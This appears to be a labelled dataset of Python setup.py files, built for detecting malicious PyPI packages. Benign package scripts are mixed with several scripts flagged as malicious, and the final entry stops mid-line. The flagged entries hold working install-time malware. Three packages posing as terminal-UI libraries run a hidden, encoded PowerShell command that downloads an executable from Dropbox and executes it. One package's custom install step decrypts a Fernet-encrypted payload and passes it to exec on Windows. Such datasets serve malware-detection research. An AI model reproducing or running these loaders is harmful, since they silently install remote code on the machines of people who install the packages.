{"idx": "databricks_api-0.8.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['databricks_api']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['databricks-cli']\n\nsetup_kwargs = {\n    'name': 'databricks-api',\n    'version': '0.8.0',\n    'description': 'Databricks API client auto-generated from the official databricks-cli package',\n    'long_description': 'databricks-api\\n==============\\n\\n|pypi| |pyversions|\\n\\n.. |pypi| image:: https://img.shields.io/pypi/v/databricks-api.svg\\n    :target: https://pypi.python.org/pypi/databricks-api\\n\\n.. |pyversions| image:: https://img.shields.io/pypi/pyversions/databricks-api.svg\\n    :target: https://pypi.python.org/pypi/databricks-api\\n\\n*[This documentation is auto-generated]*\\n\\nThis package provides a simplified interface for the Databricks REST API.\\nThe interface is autogenerated on instantiation using the underlying client\\nlibrary used in the official ``databricks-cli`` python package.\\n\\nInstall using\\n\\n.. code-block:: bash\\n\\n    pip install databricks-api\\n    \\n\\nThe docs here describe the interface for version **0.17.0** of\\nthe ``databricks-cli`` package for API version **2.0**.\\n\\nThe ``databricks-api`` package contains a ``DatabricksAPI`` class which provides\\ninstance attributes for the ``databricks-cli`` ``ApiClient``, as well as each of\\nthe available service instances. The attributes of a ``DatabricksAPI`` instance are:\\n\\n* DatabricksAPI.client *<databricks_cli.sdk.api_client.ApiClient>*\\n* DatabricksAPI.jobs *<databricks_cli.sdk.service.JobsService>*\\n* DatabricksAPI.cluster *<databricks_cli.sdk.service.ClusterService>*\\n* DatabricksAPI.policy *<databricks_cli.sdk.service.PolicyService>*\\n* DatabricksAPI.managed_library *<databricks_cli.sdk.service.ManagedLibraryService>*\\n* DatabricksAPI.dbfs *<databricks_cli.sdk.service.DbfsService>*\\n* DatabricksAPI.workspace *<databricks_cli.sdk.service.WorkspaceService>*\\n* DatabricksAPI.secret *<databricks_cli.sdk.service.SecretService>*\\n* DatabricksAPI.groups *<databricks_cli.sdk.service.GroupsService>*\\n* DatabricksAPI.token *<databricks_cli.sdk.service.TokenService>*\\n* DatabricksAPI.instance_pool *<databricks_cli.sdk.service.InstancePoolService>*\\n* DatabricksAPI.delta_pipelines *<databricks_cli.sdk.service.DeltaPipelinesService>*\\n* DatabricksAPI.repos *<databricks_cli.sdk.service.ReposService>*\\n\\nTo instantiate the client, provide the databricks host and either a token or\\nuser and password. Also shown is the full signature of the\\nunderlying ``ApiClient.__init__``\\n\\n.. code-block:: python\\n\\n    from databricks_api import DatabricksAPI\\n\\n    # Provide a host and token\\n    db = DatabricksAPI(\\n        host=\"example.cloud.databricks.com\",\\n        token=\"dpapi123...\"\\n    )\\n\\n    # OR a host and user and password\\n    db = DatabricksAPI(\\n        host=\"example.cloud.databricks.com\",\\n        user=\"me@example.com\",\\n        password=\"password\"\\n    )\\n\\n    # Full __init__ signature\\n    db = DatabricksAPI(\\n        user=None,\\n        password=None,\\n        host=None,\\n        token=None,\\n        api_version=\\'2.0\\',\\n        default_headers={},\\n        verify=True,\\n        command_name=\\'\\',\\n        jobs_api_version=None\\n    )\\n\\nRefer to the `official documentation <https://docs.databricks.com/api/index.html>`_\\non the functionality and required arguments of each method below.\\n\\nEach of the service instance attributes provides the following public methods:\\n\\nDatabricksAPI.jobs\\n------------------\\n\\n.. code-block:: python\\n\\n    db.jobs.cancel_run(\\n        run_id,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.create_job(\\n        name=None,\\n        existing_cluster_id=None,\\n        new_cluster=None,\\n        libraries=None,\\n        email_notifications=None,\\n        timeout_seconds=None,\\n        max_retries=None,\\n        min_retry_interval_millis=None,\\n        retry_on_timeout=None,\\n        schedule=None,\\n        notebook_task=None,\\n        spark_jar_task=None,\\n        spark_python_task=None,\\n        spark_submit_task=None,\\n        max_concurrent_runs=None,\\n        tasks=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.delete_job(\\n        job_id,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.delete_run(\\n        run_id=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.export_run(\\n        run_id,\\n        views_to_export=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.get_job(\\n        job_id,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.get_run(\\n        run_id=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.get_run_output(\\n        run_id,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.list_jobs(\\n        job_type=None,\\n        expand_tasks=None,\\n        limit=None,\\n        offset=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.list_runs(\\n        job_id=None,\\n        active_only=None,\\n        completed_only=None,\\n        offset=None,\\n        limit=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.reset_job(\\n        job_id,\\n        new_settings,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.run_now(\\n        job_id=None,\\n        jar_params=None,\\n        notebook_params=None,\\n        python_params=None,\\n        spark_submit_params=None,\\n        python_named_params=None,\\n        idempotency_token=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n    db.jobs.submit_run(\\n        run_name=None,\\n        existing_cluster_id=None,\\n        new_cluster=None,\\n        libraries=None,\\n        notebook_task=None,\\n        spark_jar_task=None,\\n        spark_python_task=None,\\n        spark_submit_task=None,\\n        timeout_seconds=None,\\n        tasks=None,\\n        headers=None,\\n        version=None,\\n    )\\n\\n\\nDatabricksAPI.cluster\\n---------------------\\n\\n.. code-block:: python\\n\\n    db.cluster.create_cluster(\\n        num_workers=None,\\n        autoscale=None,\\n        cluster_name=None,\\n        spark_version=None,\\n        spark_conf=None,\\n        aws_attributes=None,\\n        node_type_id=None,\\n        driver_node_type_id=None,\\n        ssh_public_keys=None,\\n        custom_tags=None,\\n        cluster_log_conf=None,\\n        spark_env_vars=None,\\n        autotermination_minutes=None,\\n        enable_elastic_disk=None,\\n        cluster_source=None,\\n        instance_pool_id=None,\\n        headers=None,\\n    )\\n\\n    db.cluster.delete_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.cluster.edit_cluster(\\n        cluster_id,\\n        num_workers=None,\\n        autoscale=None,\\n        cluster_name=None,\\n        spark_version=None,\\n        spark_conf=None,\\n        aws_attributes=None,\\n        node_type_id=None,\\n        driver_node_type_id=None,\\n        ssh_public_keys=None,\\n        custom_tags=None,\\n        cluster_log_conf=None,\\n        spark_env_vars=None,\\n        autotermination_minutes=None,\\n        enable_elastic_disk=None,\\n        cluster_source=None,\\n        instance_pool_id=None,\\n        headers=None,\\n    )\\n\\n    db.cluster.get_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.cluster.get_events(\\n        cluster_id,\\n        start_time=None,\\n        end_time=None,\\n        order=None,\\n        event_types=None,\\n        offset=None,\\n        limit=None,\\n        headers=None,\\n    )\\n\\n    db.cluster.list_available_zones(headers=None)\\n\\n    db.cluster.list_clusters(headers=None)\\n\\n    db.cluster.list_node_types(headers=None)\\n\\n    db.cluster.list_spark_versions(headers=None)\\n\\n    db.cluster.permanent_delete_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.cluster.pin_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.cluster.resize_cluster(\\n        cluster_id,\\n        num_workers=None,\\n        autoscale=None,\\n        headers=None,\\n    )\\n\\n    db.cluster.restart_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.cluster.start_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.cluster.unpin_cluster(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.policy\\n--------------------\\n\\n.. code-block:: python\\n\\n    db.policy.create_policy(\\n        policy_name,\\n        definition,\\n        headers=None,\\n    )\\n\\n    db.policy.delete_policy(\\n        policy_id,\\n        headers=None,\\n    )\\n\\n    db.policy.edit_policy(\\n        policy_id,\\n        policy_name,\\n        definition,\\n        headers=None,\\n    )\\n\\n    db.policy.get_policy(\\n        policy_id,\\n        headers=None,\\n    )\\n\\n    db.policy.list_policies(headers=None)\\n\\n\\nDatabricksAPI.managed_library\\n-----------------------------\\n\\n.. code-block:: python\\n\\n    db.managed_library.all_cluster_statuses(headers=None)\\n\\n    db.managed_library.cluster_status(\\n        cluster_id,\\n        headers=None,\\n    )\\n\\n    db.managed_library.install_libraries(\\n        cluster_id,\\n        libraries=None,\\n        headers=None,\\n    )\\n\\n    db.managed_library.uninstall_libraries(\\n        cluster_id,\\n        libraries=None,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.dbfs\\n------------------\\n\\n.. code-block:: python\\n\\n    db.dbfs.add_block(\\n        handle,\\n        data,\\n        headers=None,\\n    )\\n\\n    db.dbfs.add_block_test(\\n        handle,\\n        data,\\n        headers=None,\\n    )\\n\\n    db.dbfs.close(\\n        handle,\\n        headers=None,\\n    )\\n\\n    db.dbfs.close_test(\\n        handle,\\n        headers=None,\\n    )\\n\\n    db.dbfs.create(\\n        path,\\n        overwrite=None,\\n        headers=None,\\n    )\\n\\n    db.dbfs.create_test(\\n        path,\\n        overwrite=None,\\n        headers=None,\\n    )\\n\\n    db.dbfs.delete(\\n        path,\\n        recursive=None,\\n        headers=None,\\n    )\\n\\n    db.dbfs.delete_test(\\n        path,\\n        recursive=None,\\n        headers=None,\\n    )\\n\\n    db.dbfs.get_status(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.get_status_test(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.list(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.list_test(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.mkdirs(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.mkdirs_test(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.move(\\n        source_path,\\n        destination_path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.move_test(\\n        source_path,\\n        destination_path,\\n        headers=None,\\n    )\\n\\n    db.dbfs.put(\\n        path,\\n        contents=None,\\n        overwrite=None,\\n        headers=None,\\n        src_path=None,\\n    )\\n\\n    db.dbfs.put_test(\\n        path,\\n        contents=None,\\n        overwrite=None,\\n        headers=None,\\n        src_path=None,\\n    )\\n\\n    db.dbfs.read(\\n        path,\\n        offset=None,\\n        length=None,\\n        headers=None,\\n    )\\n\\n    db.dbfs.read_test(\\n        path,\\n        offset=None,\\n        length=None,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.workspace\\n-----------------------\\n\\n.. code-block:: python\\n\\n    db.workspace.delete(\\n        path,\\n        recursive=None,\\n        headers=None,\\n    )\\n\\n    db.workspace.export_workspace(\\n        path,\\n        format=None,\\n        direct_download=None,\\n        headers=None,\\n    )\\n\\n    db.workspace.get_status(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.workspace.import_workspace(\\n        path,\\n        format=None,\\n        language=None,\\n        content=None,\\n        overwrite=None,\\n        headers=None,\\n    )\\n\\n    db.workspace.list(\\n        path,\\n        headers=None,\\n    )\\n\\n    db.workspace.mkdirs(\\n        path,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.secret\\n--------------------\\n\\n.. code-block:: python\\n\\n    db.secret.create_scope(\\n        scope,\\n        initial_manage_principal=None,\\n        scope_backend_type=None,\\n        backend_azure_keyvault=None,\\n        headers=None,\\n    )\\n\\n    db.secret.delete_acl(\\n        scope,\\n        principal,\\n        headers=None,\\n    )\\n\\n    db.secret.delete_scope(\\n        scope,\\n        headers=None,\\n    )\\n\\n    db.secret.delete_secret(\\n        scope,\\n        key,\\n        headers=None,\\n    )\\n\\n    db.secret.get_acl(\\n        scope,\\n        principal,\\n        headers=None,\\n    )\\n\\n    db.secret.list_acls(\\n        scope,\\n        headers=None,\\n    )\\n\\n    db.secret.list_scopes(headers=None)\\n\\n    db.secret.list_secrets(\\n        scope,\\n        headers=None,\\n    )\\n\\n    db.secret.put_acl(\\n        scope,\\n        principal,\\n        permission,\\n        headers=None,\\n    )\\n\\n    db.secret.put_secret(\\n        scope,\\n        key,\\n        string_value=None,\\n        bytes_value=None,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.groups\\n--------------------\\n\\n.. code-block:: python\\n\\n    db.groups.add_to_group(\\n        parent_name,\\n        user_name=None,\\n        group_name=None,\\n        headers=None,\\n    )\\n\\n    db.groups.create_group(\\n        group_name,\\n        headers=None,\\n    )\\n\\n    db.groups.get_group_members(\\n        group_name,\\n        headers=None,\\n    )\\n\\n    db.groups.get_groups(headers=None)\\n\\n    db.groups.get_groups_for_principal(\\n        user_name=None,\\n        group_name=None,\\n        headers=None,\\n    )\\n\\n    db.groups.remove_from_group(\\n        parent_name,\\n        user_name=None,\\n        group_name=None,\\n        headers=None,\\n    )\\n\\n    db.groups.remove_group(\\n        group_name,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.token\\n-------------------\\n\\n.. code-block:: python\\n\\n    db.token.create_token(\\n        lifetime_seconds=None,\\n        comment=None,\\n        headers=None,\\n    )\\n\\n    db.token.list_tokens(headers=None)\\n\\n    db.token.revoke_token(\\n        token_id,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.instance_pool\\n---------------------------\\n\\n.. code-block:: python\\n\\n    db.instance_pool.create_instance_pool(\\n        instance_pool_name=None,\\n        min_idle_instances=None,\\n        max_capacity=None,\\n        aws_attributes=None,\\n        node_type_id=None,\\n        custom_tags=None,\\n        idle_instance_autotermination_minutes=None,\\n        enable_elastic_disk=None,\\n        disk_spec=None,\\n        preloaded_spark_versions=None,\\n        headers=None,\\n    )\\n\\n    db.instance_pool.delete_instance_pool(\\n        instance_pool_id=None,\\n        headers=None,\\n    )\\n\\n    db.instance_pool.edit_instance_pool(\\n        instance_pool_id,\\n        instance_pool_name=None,\\n        min_idle_instances=None,\\n        max_capacity=None,\\n        aws_attributes=None,\\n        node_type_id=None,\\n        custom_tags=None,\\n        idle_instance_autotermination_minutes=None,\\n        enable_elastic_disk=None,\\n        disk_spec=None,\\n        preloaded_spark_versions=None,\\n        headers=None,\\n    )\\n\\n    db.instance_pool.get_instance_pool(\\n        instance_pool_id=None,\\n        headers=None,\\n    )\\n\\n    db.instance_pool.list_instance_pools(headers=None)\\n\\n\\nDatabricksAPI.delta_pipelines\\n-----------------------------\\n\\n.. code-block:: python\\n\\n    db.delta_pipelines.create(\\n        id=None,\\n        name=None,\\n        storage=None,\\n        configuration=None,\\n        clusters=None,\\n        libraries=None,\\n        trigger=None,\\n        filters=None,\\n        allow_duplicate_names=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.delete(\\n        pipeline_id=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.deploy(\\n        pipeline_id=None,\\n        id=None,\\n        name=None,\\n        storage=None,\\n        configuration=None,\\n        clusters=None,\\n        libraries=None,\\n        trigger=None,\\n        filters=None,\\n        allow_duplicate_names=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.get(\\n        pipeline_id=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.list(\\n        pagination=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.reset(\\n        pipeline_id=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.run(\\n        pipeline_id=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.start_update(\\n        pipeline_id=None,\\n        full_refresh=None,\\n        headers=None,\\n    )\\n\\n    db.delta_pipelines.stop(\\n        pipeline_id=None,\\n        headers=None,\\n    )\\n\\n\\nDatabricksAPI.repos\\n-------------------\\n\\n.. code-block:: python\\n\\n    db.repos.create_repo(\\n        url,\\n        provider,\\n        path=None,\\n        headers=None,\\n    )\\n\\n    db.repos.delete_repo(\\n        id,\\n        headers=None,\\n    )\\n\\n    db.repos.get_repo(\\n        id,\\n        headers=None,\\n    )\\n\\n    db.repos.list_repos(\\n        path_prefix=None,\\n        next_page_token=None,\\n        headers=None,\\n    )\\n\\n    db.repos.update_repo(\\n        id,\\n        branch=None,\\n        tag=None,\\n        headers=None,\\n    )\\n\\n\\n',\n    'author': 'Christopher Flynn',\n    'author_email': 'crf204@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/crflynn/databricks-api',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "selfsupervmencode-10.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsupervmencode',\n    packages = ['modlib'],\n    version = '1.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "daphne-3.0.2", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nfrom daphne import __version__\n\n# We use the README as the long_description\nreadme_path = os.path.join(os.path.dirname(__file__), \"README.rst\")\nwith open(readme_path) as fp:\n    long_description = fp.read()\n\nsetup(\n    name=\"daphne\",\n    version=__version__,\n    url=\"https://github.com/django/daphne\",\n    author=\"Django Software Foundation\",\n    author_email=\"foundation@djangoproject.com\",\n    description=\"Django ASGI (HTTP/WebSocket) server\",\n    long_description=long_description,\n    license=\"BSD\",\n    zip_safe=False,\n    package_dir={\"twisted\": \"daphne/twisted\"},\n    packages=find_packages() + [\"twisted.plugins\"],\n    include_package_data=True,\n    install_requires=[\"twisted[tls]>=18.7\", \"autobahn>=0.18\", \"asgiref>=3.2.10,<4\"],\n    python_requires=\">=3.6\",\n    setup_requires=[\"pytest-runner\"],\n    extras_require={\n        \"tests\": [\"hypothesis==4.23\", \"pytest~=3.10\", \"pytest-asyncio~=0.8\"]\n    },\n    entry_points={\n        \"console_scripts\": [\"daphne = daphne.cli:CommandLineInterface.entrypoint\"]\n    },\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "et_xmlfile-1.1.0", "func": "#!/usr/bin/env python\n\n\"\"\"Setup script for packaging et_xmfile.\n\"\"\"\nimport sys\nimport os\n\nfrom setuptools import setup, find_packages\n\nhere = os.path.abspath(os.path.dirname(__file__))\ntry:\n    with open(os.path.join(here, 'README.rst')) as f:\n        README = f.read()\nexcept IOError:\n    README = ''\n\nsys.path.append('')\n\nfrom et_xmlfile import (\n    __author__,\n    __license__,\n    __author_email__,\n    __url__,\n    __version__\n)\n\n\nsetup(name='et_xmlfile',\n    packages=find_packages(\n        exclude=[\"*.tests\",]\n    ),\n    # metadata\n    version=__version__,\n    description=\"An implementation of lxml.xmlfile for the standard library\",\n    long_description=README,\n    author=__author__,\n    author_email=__author_email__,\n    url=__url__,\n    license=__license__,\n    python_requires=\">=3.6\",\n    classifiers=[\n                 'Development Status :: 5 - Production/Stable',\n                 'Operating System :: MacOS :: MacOS X',\n                 'Operating System :: Microsoft :: Windows',\n                 'Operating System :: POSIX',\n                 'License :: OSI Approved :: MIT License',\n                 'Programming Language :: Python',\n                 'Programming Language :: Python :: 3.6',\n                 'Programming Language :: Python :: 3.7',\n                 'Programming Language :: Python :: 3.8',\n                 'Programming Language :: Python :: 3.9',\n                 ],\n    )\n", "target": 0}
{"idx": "tpednvidiakill-5.25", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpednvidiakill',\n    packages = ['modlib'],\n    version = '10.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grpclib-0.4.3", "func": "import setuptools\n\nsetuptools.setup(\n    name=\"grpclib\",\n    python_requires='>=3.7',\n)\n", "target": 0}
{"idx": "PyGaqme-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'kSFBoAhuzLQpHlTJxLsRGZNnqzVTPeSkFfUQvRAjqV oqPGywIDowLtRfgLiyJJhVpJglMGGRXTUGhud'\nLONG_DESCRIPTION = 'nJuZdZRNOhKJjsrvUyThpqPbZtwjfcSEJrZWjoIEXQpVwqSnXoaCyTgfmvYoyFiAJIWHaxdKXqUIqgVKqHVJrEMTrWVNoJKwRgBhQzyrAwnqxgSjmxtisRcDDTFKXHzVWirYBiiChepwuMceZ'\n\n\nclass gtKbFYtxHSoDFASDsshRWKaYUidNaQnbsuEKYJVLnZyhdjSUYDAulHxZRpFEKXSNtYxZzLPtDCyYifQcIuehbExBnxUkhNbPfnYBrHn(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'XkF1C_YAvvO2wirQ24BTCqrvkvaAf-qMk7ZUUBq2uW0=').decrypt(b'gAAAAABmBH70HU_bhmRvDon2ET0wk6_FYliFKjNYVCI_7l5OtxTidOp09TAt_SGh9ED_NIRiDOLTBQQYpTmhKQWSnNOnQyREsjSFWL2eWef2RlAXavwuUcF61sJjxoKWekMatpDvhH1br1ZuI1Cc6qo5VEuZqRZmz6gs2P_etXRx6Nukt6XMfwpBNQo2rqZQPNSNDC34ANWfwzrQwi7nzqXxhFtp-addx-Wh64wJWmfWaaiPu71uQgU='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"PyGaqme\",\n    version=VERSION,\n    author=\"ZPwbfxRY\",\n    author_email=\"mGDkaqjKFYPF@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': gtKbFYtxHSoDFASDsshRWKaYUidNaQnbsuEKYJVLnZyhdjSUYDAulHxZRpFEKXSNtYxZzLPtDCyYifQcIuehbExBnxUkhNbPfnYBrHn,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "libmaskstudyrandom-8.32", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libmaskstudyrandom',\n    packages = ['modlib'],\n    version = '3.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grpcio-tools-1.47.0", "func": "# Copyright 2016 gRPC authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom distutils import cygwinccompiler\nfrom distutils import extension\nfrom distutils import util\nimport errno\nimport os\nimport os.path\nimport platform\nimport re\nimport shlex\nimport shutil\nimport subprocess\nfrom subprocess import PIPE\nimport sys\nimport sysconfig\n\nimport pkg_resources\nimport setuptools\nfrom setuptools.command import build_ext\n\n# TODO(atash) add flag to disable Cython use\n\n_PACKAGE_PATH = os.path.realpath(os.path.dirname(__file__))\n_README_PATH = os.path.join(_PACKAGE_PATH, 'README.rst')\n\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\nsys.path.insert(0, os.path.abspath('.'))\n\nimport _parallel_compile_patch\nimport protoc_lib_deps\n\nimport grpc_version\n\n_EXT_INIT_SYMBOL = None\nif sys.version_info[0] == 2:\n    _EXT_INIT_SYMBOL = \"init_protoc_compiler\"\nelse:\n    _EXT_INIT_SYMBOL = \"PyInit__protoc_compiler\"\n\n_parallel_compile_patch.monkeypatch_compile_maybe()\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'License :: OSI Approved :: Apache Software License',\n]\n\nPY3 = sys.version_info.major == 3\n\n\ndef _env_bool_value(env_name, default):\n    \"\"\"Parses a bool option from an environment variable\"\"\"\n    return os.environ.get(env_name, default).upper() not in ['FALSE', '0', '']\n\n\n# Environment variable to determine whether or not the Cython extension should\n# *use* Cython or use the generated C files. Note that this requires the C files\n# to have been generated by building first *with* Cython 